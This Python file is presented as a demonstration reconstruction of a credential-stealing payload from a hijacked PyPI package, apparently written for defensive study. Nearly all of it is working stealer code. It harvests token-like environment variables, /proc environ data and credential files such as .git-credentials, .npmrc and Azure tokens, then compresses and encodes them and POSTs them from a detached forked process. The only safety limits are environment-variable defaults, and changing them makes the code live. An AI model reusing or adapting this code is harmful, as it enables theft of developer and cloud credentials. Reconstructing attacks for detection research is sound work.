# ============================================================================
# DEMONSTRATION RECONSTRUCTION — NOT MALWARE — SBOB-Examples scenario A
# Reconstructed from public advisories (Wiz, OpenSourceMalware, Aikido,
# Socket; 2026-11-17 agent-framework PyPI hijack, version 1.26.1).
#
# Faithful to the original (per advisories):
#   - run-once guard _AF_TEL; fork into a detached session (os.setsid()) with
#     a daemon-thread fallback where fork is unavailable
#   - env-var collection by name match: TOKEN, SECRET, PASSWORD, KEY, AZURE,
#     AWS, GITHUB, OPENAI, HF_, FOUNDRY, NPM, PIP, NUGET, SYSTEM, BUILD, AGENT
#   - up to 300 /proc/*/environ reads
#   - up to 60 credential files (~/.azure, .npmrc, pip.conf, .netrc,
#     .git-credentials, .docker/config.json, HF tokens, ADO agent
#     .credentials, .env and JSON under /app and /workspace)
#   - ADO OIDC + Azure managed-identity/IMDS collection (12 resources) +
#     Azure instance metadata
#   - one JSON document, zlib-compressed, base64-encoded, a single POST
#     (original: HTTPS to webhook[.]site; user-agent af-runtime-diagnostics/1)
#   - hardcoded endpoint, no fallback channel, failures silently ignored and
#     never retried
#
# Safety replacements (docs/TDS.md §4 hard rules):
#   - exfil endpoint is AF_SINK_URL, a LOOPBACK-ONLY sink (never the real
#     webhook URL); the socket guard makes any non-loopback connect fatal
#   - credential paths resolve under the synthetic fixture HOME (AF_HOME)
#     and pseudo-proc root (AF_PROC_ROOT); unset AF_HOME => collection
#     refuses (never touches the real user home or real /proc)
#   - metadata endpoints (ADO OIDC, IMDS, instance metadata) are recorded as
#     request shapes ONLY — never issued
#   - AF_TEST_NO_FORK=1 runs inline for deterministic tests
# ============================================================================
import base64
import json
import os
import socket
import sys
import threading
import time
import urllib.request
import zlib

_ENV_KEYS = (
    "TOKEN", "SECRET", "PASSWORD", "KEY", "AZURE", "AWS", "GITHUB",
    "OPENAI", "HF_", "FOUNDRY", "NPM", "PIP", "NUGET", "SYSTEM", "BUILD",
    "AGENT",
)
_MAX_PROC = 300
_MAX_FILES = 60
_USER_AGENT = "af-runtime-diagnostics/1"
_GUARD_ENV = "_AF_TEL"

_CRED_FILES = (
    ".azure/azureProfile.json",
    ".azure/accessToken.json",
    ".npmrc",
    ".pip/pip.conf",
    "pip.conf",
    ".netrc",
    ".git-credentials",
    ".docker/config.json",
    ".cache/huggingface/token",
    ".azure-devops/agent/.credentials",
    ".env",
    "app/.env",
    "app/config.json",
    "app/settings.json",
    "workspace/.env",
    "workspace/config.json",
    "workspace/settings.json",
)

# Metadata endpoints: request shapes only. NEVER issued (safety boundary).
_METADATA_SHAPES = {
    "azure_devops_oidc": {
        "requires": ["SYSTEM_ACCESSTOKEN", "SYSTEM_OIDCREQUESTURI"],
        "audience": "api://AzureADTokenExchange",
    },
    "imds_managed_identity": {
        "endpoint_shape": "http://169.254.169.254/metadata/oauth2/token",
        "resources": [
            "https://management.azure.com/",
            "https://graph.microsoft.com/",
            "https://vault.azure.net/",
            "https://storage.azure.com/",
            "https://cognitiveservices.azure.com/",
            "https://azureml.azure.com/",
            "https://search.azure.com/",
            "https://containerregistry.azure.com/",
            "https://app.vssps.visualstudio.com/",
            "499b84ac-1321-427f-aa17-267f5a2b4bb3",
            "https://database.azure.com/",
            "api://AzureADTokenExchange",
        ],
    },
    "instance_metadata": {
        "endpoint_shape": "http://169.254.169.254/metadata/instance",
    },
}


def _sink_url():
    # Original: hardcoded https://webhook[.]site/<uuid>?t=telemetry (defanged).
    # Demo: loopback-only sink; the real URL is never contacted.
    return os.environ.get("AF_SINK_URL", "http://127.0.0.1:8099/?t=telemetry")


def _collect_env():
    out = {}
    for key, value in os.environ.items():
        if any(marker in key for marker in _ENV_KEYS):
            out[key] = value
    return out


def _collect_proc_environ(root, limit=_MAX_PROC):
    # Original: up to 300 real /proc/<pid>/environ files. Demo: AF_PROC_ROOT
    # pseudo-proc tree with synthetic environ files only.
    out = {}
    try:
        pids = sorted(os.listdir(root))[:limit]
    except OSError:
        return out
    for pid in pids:
        try:
            with open(os.path.join(root, pid, "environ"), "rb") as fh:
                data = fh.read().decode("utf-8", "replace")
            env = {}
            for entry in data.split("\n"):
                if "=" in entry:
                    k, _, v = entry.partition("=")
                    if any(marker in k for marker in _ENV_KEYS):
                        env[k] = v
            if env:
                out[pid] = env
        except OSError:
            continue
    return out


def _collect_credential_files(home, limit=_MAX_FILES):
    # Original: real credential paths on the victim. Demo: fixture HOME only;
    # a missing AF_HOME makes the collector refuse (fail-safe).
    out = {}
    if not home:
        return out
    for rel in _CRED_FILES[:limit]:
        path = os.path.join(home, rel)
        try:
            with open(path, "r", encoding="utf-8", errors="replace") as fh:
                out[rel] = fh.read()[:4096]
        except OSError:
            continue
    return out


def _collect_metadata():
    # Shapes recorded only; the original issued these requests against live
    # endpoints (ADO OIDC when SYSTEM_* was set, IMDS/App Service identity).
    present = [k for k in _METADATA_SHAPES["azure_devops_oidc"]["requires"]
               if os.environ.get(k)]
    shapes = dict(_METADATA_SHAPES)
    shapes["azure_devops_oidc"] = dict(
        _METADATA_SHAPES["azure_devops_oidc"],
        triggers_present=present,
    )
    return shapes


def _collect():
    home = os.environ.get("AF_HOME", "")
    proc_root = os.environ.get("AF_PROC_ROOT", "")
    if not home:
        sys.stderr.write(
            "demo-safety: AF_HOME not set; credential collection refused\n"
        )
    doc = {
        "collected_at": time.time(),
        "pid": os.getpid(),
        "env": _collect_env(),
        "proc_environ": _collect_proc_environ(proc_root),
        "credential_files": _collect_credential_files(home),
        "metadata": _collect_metadata(),
    }
    return doc


def _stage(doc):
    # Original staging: one JSON document, zlib-compressed, base64-encoded.
    return base64.b64encode(zlib.compress(json.dumps(doc).encode("utf-8")))


def _exfil(payload):
    # Original: single HTTPS POST, hardcoded URL, no fallback, silent failure.
    request = urllib.request.Request(
        _sink_url(),
        data=payload,
        headers={"User-Agent": _USER_AGENT},
        method="POST",
    )
    urllib.request.urlopen(request, timeout=10)


def _run_once():
    try:
        payload = _stage(_collect())
        _exfil(payload)
    except Exception:
        # Faithful: failures are silently ignored and not retried.
        # Demo-only debug aid: AF_DEBUG=1 prints the swallowed exception.
        if os.environ.get("AF_DEBUG") == "1":
            import traceback
            traceback.print_exc()


def _start():
    if os.environ.get(_GUARD_ENV) == "1":
        return
    os.environ[_GUARD_ENV] = "1"  # avoid running again in child processes
    if os.environ.get("AF_TEST_NO_FORK") == "1":
        _run_once()
        return
    try:
        pid = os.fork()
    except (AttributeError, OSError):
        # Fallback where fork is unavailable: a daemon thread.
        threading.Thread(target=_run_once, daemon=True).start()
        return
    if pid == 0:
        try:
            os.setsid()  # detach: the stealer survives its parent
        except OSError:
            pass
        _run_once()
        os._exit(0)
    # Parent returns immediately; the demo child is reaped by init (detached).
